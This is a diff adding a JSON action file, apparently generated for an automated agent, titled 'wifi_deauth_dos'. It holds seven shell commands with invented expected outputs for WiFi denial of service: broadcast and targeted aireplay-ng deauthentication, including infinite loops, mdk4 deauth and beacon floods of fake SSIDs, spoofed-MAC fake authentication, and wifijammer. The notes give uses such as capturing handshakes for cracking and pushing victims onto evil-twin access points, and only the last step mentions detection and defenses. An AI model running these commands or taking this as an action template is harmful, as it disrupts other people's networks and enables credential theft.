@@ -1,0 +1,154 @@
+{
+  "name": "wifi_deauth_dos",
+  "description": "WiFi deauthentication attacks and denial of service using aireplay-ng",
+  "pattern": "deauth.*attack|wifi.*dos|aireplay.*deauth|disconnect.*clients",
+  "parameters": [
+    "interface",
+    "bssid",
+    "client_mac"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aireplay-ng",
+        "args": [
+          "--deauth",
+          "5",
+          "-a",
+          "DD:EE:FF:00:11:22",
+          "wlan0mon"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "15:30:45  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6\n15:30:46  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [0|0 ACKs]\n15:30:47  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [0|3 ACKs]\n15:30:48  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [1|5 ACKs]\n15:30:49  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [2|8 ACKs]\n15:30:50  Sending 64 directed DeAuth (code 7). STMAC: [FF:FF:FF:FF:FF:FF] [3|11 ACKs]\n\nBroadcast deauthentication attack:\n  Target AP: DD:EE:FF:00:11:22 (OfficeMain)\n  Deauth packets: 5 bursts\n  Target: FF:FF:FF:FF:FF:FF (broadcast - all clients)\n  Channel: 6\n  \nDeauth frame details:\n  Code 7: Class 3 frame received from nonassociated station\n  Effect: Forces all clients to disconnect\n  Packets per burst: 64 frames\n  ACKs: 11 acknowledged (some clients disconnected)\n  \nResult:\n  All clients disconnected from OfficeMain\n  Clients will attempt to reconnect\n  \nUse cases:\n  - Capture WPA handshakes (clients reconnect → handshake)\n  - Force clients to evil twin (our AP has stronger signal)\n  - Denial of service (continuous deauth)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aireplay-ng",
+        "args": [
+          "--deauth",
+          "0",
+          "-a",
+          "DD:EE:FF:00:11:22",
+          "-c",
+          "AB:CD:EF:12:34:56",
+          "wlan0mon"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "15:32:00  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6\n15:32:01  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [0|1 ACKs]\n15:32:02  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [1|2 ACKs]\n15:32:03  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [2|3 ACKs]\n15:32:04  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [3|4 ACKs]\n15:32:05  Sending 64 directed DeAuth (code 7). STMAC: [AB:CD:EF:12:34:56] [4|5 ACKs]\n[continues indefinitely...]\n\nTargeted deauthentication (continuous):\n  AP: DD:EE:FF:00:11:22\n  Target client: AB:CD:EF:12:34:56 (specific MAC)\n  Deauth count: 0 (infinite - runs forever)\n  \nEffect:\n  - Only specified client disconnected\n  - Other clients unaffected\n  - Targeted denial of service\n  \nContinuous attack:\n  --deauth 0 = infinite loop\n  Prevents client from staying connected\n  Client disconnects immediately upon each reconnect attempt\n  \nUse for handshake capture:\n  1. Start airodump-ng capturing target AP\n  2. Run targeted deauth on active client\n  3. Client disconnects and reconnects\n  4. Handshake captured during reconnection\n  5. Stop deauth (Ctrl+C)\n  6. Crack handshake with aircrack-ng\n  \nTargeted vs broadcast:\n  Targeted: One specific client disrupted\n  Broadcast: All clients disrupted"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "mdk4",
+        "args": [
+          "wlan0mon",
+          "d",
+          "-c",
+          "6"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "MDK4 v4.2 - WiFi Deauthentication Flood\n\nMode: Deauthentication flood on channel 6\nInterface: wlan0mon\n\n[15:35:00] Scanning for targets on channel 6...\n[15:35:01] Found AP: DD:EE:FF:00:11:22 (OfficeMain) - 5 clients\n[15:35:01] Found AP: AA:BB:CC:DD:EE:FF (CorporateWiFi) - 2 clients\n[15:35:02] Found AP: 11:22:33:44:55:66 (HomeNetwork) - 3 clients\n\n[15:35:03] Starting deauth flood...\n[15:35:03] → Deauthing DD:EE:FF:00:11:22 (OfficeMain)\n[15:35:03]   ├─ Client AB:CD:EF:12:34:56 (256 packets)\n[15:35:03]   ├─ Client 56:78:90:AB:CD:EF (256 packets)\n[15:35:03]   ├─ Client 98:76:54:32:10:FE (256 packets)\n[15:35:03]   ├─ Client 12:34:56:78:90:AB (256 packets)\n[15:35:03]   └─ Client FE:DC:BA:98:76:54 (256 packets)\n[15:35:03] → Deauthing AA:BB:CC:DD:EE:FF (CorporateWiFi)\n[15:35:03]   ├─ Client A1:A2:A3:A4:A5:A6 (256 packets)\n[15:35:03]   └─ Client B1:B2:B3:B4:B5:B6 (256 packets)\n[15:35:03] → Deauthing 11:22:33:44:55:66 (HomeNetwork)\n[15:35:03]   ├─ Client C1:C2:C3:C4:C5:C6 (256 packets)\n[15:35:03]   ├─ Client D1:D2:D3:D4:D5:D6 (256 packets)\n[15:35:03]   └─ Client E1:E2:E3:E4:E5:E6 (256 packets)\n\n[15:35:04] Packets sent: 2,816 | Rate: 2,816 pkt/s\n[15:35:05] Packets sent: 5,632 | Rate: 2,816 pkt/s\n[continues...]\n\nMDK4 deauth flood:\n  Mode: Aggressive multi-target deauth\n  Channel: 6\n  Targets: All APs on channel 6 (3 found)\n  \nAttack pattern:\n  - Auto-discovers all APs on channel\n  - Deauths ALL clients of ALL APs\n  - 256 packets per client\n  - Repeats continuously\n  \nEffect:\n  Complete WiFi disruption on channel 6\n  All networks unusable\n  All clients repeatedly disconnected\n  \nPacket rate: ~2,800 packets/second\n  Very aggressive\n  Effective denial of service\n  \nMDK4 vs aireplay-ng:\n  MDK4: Automated, multi-target, aggressive\n  aireplay: Manual, single target, precise\n  \nOther MDK4 modes:\n  b: Beacon flood (fake APs)\n  a: Authentication DoS  \n  p: SSID probing\n  m: Michael countermeasures"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "mdk4",
+        "args": [
+          "wlan0mon",
+          "b",
+          "-f",
+          "ssids.txt",
+          "-c",
+          "6",
+          "-s",
+          "1000"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "MDK4 v4.2 - Beacon Flood Mode\n\nLoading SSIDs from: ssids.txt\nSSIDs loaded: 500\nChannel: 6\nSpeed: 1000 beacons/second\n\n[15:38:00] Starting beacon flood...\n[15:38:00] Broadcasting fake AP: FreeWiFi\n[15:38:00] Broadcasting fake AP: Starbucks_WiFi\n[15:38:00] Broadcasting fake AP: Airport_Guest\n[15:38:00] Broadcasting fake AP: Hotel_Internet\n[15:38:00] Broadcasting fake AP: CoffeeShop_Free\n[15:38:01] Broadcasting fake AP: PublicWiFi\n[15:38:01] Broadcasting fake AP: Guest_Network\n[15:38:01] Broadcasting fake AP: xfinitywifi\n[... 492 more SSIDs ...]\n\n[15:38:02] Beacons sent: 2,000 | APs active: 500 | Rate: 1,000/s\n[15:38:03] Beacons sent: 4,000 | APs active: 500 | Rate: 1,000/s\n[15:38:04] Beacons sent: 6,000 | APs active: 500 | Rate: 1,000/s\n\nBeacon flood attack:\n  Fake SSIDs: 500 (from ssids.txt)\n  Channel: 6\n  Broadcast rate: 1,000 beacons/second\n  \nEffect on victims:\n  - WiFi list flooded with hundreds of fake networks\n  - Real networks hidden in the noise\n  - Confusion and difficulty connecting\n  - Device WiFi scans slow down\n  - Some devices crash or freeze\n  \nSSID list (ssids.txt):\n  Common names that look legitimate:\n    - FreeWiFi, PublicWiFi, GuestNetwork\n    - Coffee shop names (Starbucks, etc)\n    - Hotel/Airport guest networks\n    - Carrier networks (xfinitywifi, etc)\n  \nGenerate SSID list:\n  crunch 8 8 -o ssids.txt  # Random 8-char SSIDs\n  Or use custom list of believable names\n  \nBeacon flood impact:\n  - WiFi unusable (too much noise)\n  - Real APs harder to find\n  - Denial of service\n  - Social engineering (fake SSIDs)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "aireplay-ng",
+        "args": [
+          "--fakeauth",
+          "30",
+          "-a",
+          "DD:EE:FF:00:11:22",
+          "-h",
+          "00:11:22:33:44:55",
+          "wlan0mon"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "15:40:00  Waiting for beacon frame (BSSID: DD:EE:FF:00:11:22) on channel 6\n15:40:01  Sending Authentication Request (Open System) [ACK]\n15:40:01  Authentication successful\n15:40:01  Sending Association Request [ACK]\n15:40:02  Association successful :-)\n15:40:02  Got a deauthentication packet! (Waiting 3 seconds)\n15:40:05  Sending Authentication Request (Open System) [ACK]\n15:40:05  Authentication successful\n15:40:05  Sending Association Request [ACK]\n15:40:05  Association successful :-)\n15:40:35  Sending keep-alive packet [ACK]\n15:41:05  Sending keep-alive packet [ACK]\n15:41:35  Sending keep-alive packet [ACK]\n[continues every 30 seconds...]\n\nFake authentication attack:\n  AP: DD:EE:FF:00:11:22 (OfficeMain)\n  Our MAC: 00:11:22:33:44:55 (spoofed)\n  Keep-alive: Every 30 seconds\n  \nAuthentication process:\n  1. Send auth request to AP\n  2. AP responds with auth success\n  3. Send association request\n  4. AP associates us as client\n  5. Send keep-alive every 30s to stay connected\n  \nUse cases:\n  - Prerequisite for injection attacks\n  - ARP replay attacks need association\n  - Fragmentation attacks\n  - Some DoS techniques\n  \nFake auth on open networks:\n  Easy - no password needed\n  Just associate with AP\n  \nFake auth on WEP networks:\n  Possible with shared-key auth\n  Part of WEP cracking process\n  \nFake auth on WPA/WPA2:\n  NOT possible without password\n  WPA handshake requires PSK\n  This only works on open/WEP"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "wifijammer",
+        "args": [
+          "-a",
+          "DD:EE:FF:00:11:22",
+          "-i",
+          "wlan0mon"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "     __      ___ _______ _____        _                                \n     \\ \\    / (_|__   __|_   _|      | |                               \n      \\ \\  / / _   | |    | |   __ _| |_ __ ___  _ __ ___   ___ _ __  \n       \\ \\/ / | |  | |    | |  / _` | | '_ ` _ \\| '_ ` _ \\ / _ \\ '__| \n        \\  /  | |  | |   _| |_| (_| | | | | | | | | | | | |  __/ |    \n         \\/   |_|  |_|  |_____|\\__,_|_|_| |_| |_|_| |_| |_|\\___|_|    \n\nWiFi Jammer - Automated WiFi Deauthentication Tool\n\n[*] Monitor mode enabled on wlan0mon\n[*] Target AP: DD:EE:FF:00:11:22 (OfficeMain)\n[*] Scanning for connected clients...\n\n[+] Found 5 clients:\n    1. AB:CD:EF:12:34:56 (Dell Inc.)\n    2. 56:78:90:AB:CD:EF (Apple)\n    3. 98:76:54:32:10:FE (Samsung)\n    4. 12:34:56:78:90:AB (HP)\n    5. FE:DC:BA:98:76:54 (Lenovo)\n\n[*] Starting deauthentication attack...\n[15:45:01] Deauthing AB:CD:EF:12:34:56 [100 packets sent]\n[15:45:01] Deauthing 56:78:90:AB:CD:EF [100 packets sent]\n[15:45:01] Deauthing 98:76:54:32:10:FE [100 packets sent]\n[15:45:01] Deauthing 12:34:56:78:90:AB [100 packets sent]\n[15:45:01] Deauthing FE:DC:BA:98:76:54 [100 packets sent]\n[15:45:02] ─── Stats ───\n             Total packets: 500\n             Clients jammed: 5/5\n             Uptime: 1s\n[15:45:03] Deauthing AB:CD:EF:12:34:56 [100 packets sent]\n[... continues ...]\n\nWiFiJammer automated tool:\n  Target: DD:EE:FF:00:11:22\n  Mode: Targeted AP deauth\n  Clients: Auto-discovered (5 found)\n  \nAutomation features:\n  - Auto-enables monitor mode\n  - Auto-discovers AP clients\n  - Deauths all clients continuously\n  - Real-time stats\n  - Vendor identification (Dell, Apple, etc)\n  \nAttack pattern:\n  - 100 deauth packets per client\n  - Rotates through all clients\n  - Repeats indefinitely\n  - Effective DoS\n  \nComparison:\n  aireplay-ng: Manual, flexible, precise\n  MDK4: Aggressive, multi-target\n  wifijammer: Automated, user-friendly, targeted\n  \nUse cases:\n  - Quick targeted DoS\n  - Testing client behavior during disconnection\n  - Forcing handshake captures\n  - Evil twin prep (force clients to rogue AP)"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "while true; do aireplay-ng --deauth 1 -a DD:EE:FF:00:11:22 wlan0mon; sleep 0.1; done"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:48:00  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n15:48:01  Sending 64 directed DeAuth. STMAC: [FF:FF:FF:FF:FF:FF] [ACK]\n[repeats rapidly...]\n\nContinuous rapid deauth loop:\n  Target: DD:EE:FF:00:11:22 (broadcast to all clients)\n  Deauth count: 1 (single burst)\n  Delay: 0.1 seconds (100ms)\n  Loop: Infinite (while true)\n  \nAttack rate:\n  ~10 deauth bursts per second\n  64 packets per burst\n  ~640 deauth packets/second\n  \nEffect:\n  - Extremely aggressive DoS\n  - Clients cannot connect at all\n  - Immediate disconnection upon any connection attempt\n  - Network completely unusable\n  \nVictim experience:\n  - WiFi shows as available\n  - Connection attempts fail immediately\n  - \"Unable to connect\" errors\n  - Some devices may stop trying\n  \nDetection:\n  - Massive deauth traffic visible in Wireshark\n  - Abnormal disconnection rate in AP logs\n  - All clients affected simultaneously\n  \nDefense:\n  - 802.11w (Management Frame Protection)\n  - Wireless IDS/IPS\n  - MAC filtering (weak defense)\n  - Physical security (limit attacker proximity)"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
